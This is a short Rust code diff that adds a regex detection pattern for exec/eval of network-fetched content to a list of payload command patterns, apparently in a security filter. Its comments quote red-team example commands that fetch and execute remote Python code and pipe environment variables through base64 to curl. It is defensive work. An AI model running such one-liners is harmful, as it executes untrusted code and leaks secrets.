@@ -409,6 +409,17 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 .expect("Invalid regex"),
                 "environment posted via interpreter network call (exfiltration)",
             ),
+            // exec/eval of network-fetched content (red-team wave-107:
+            // \`python3 -c "exec(requests.get('http://…').text)"\`) —
+            // remote code execution in one expression. exec() of a local
+            // file stays legal.
+            (
+                Regex::new(
+                    r"(?i)\b(exec|eval)\s*\(\s*(requests\.(get|post)|urlopen|urllib\.request|httpx\.[a-z]+|fetch\s*\()",
+                )
+                .expect("Invalid regex"),
+                "exec of network-fetched content (remote code execution)",
+            ),
             // $(env) substitution feeding a network tool (wave-20:
             // `echo $(env) | sed … | base64 -w0 | curl -d @- URL`).
             (
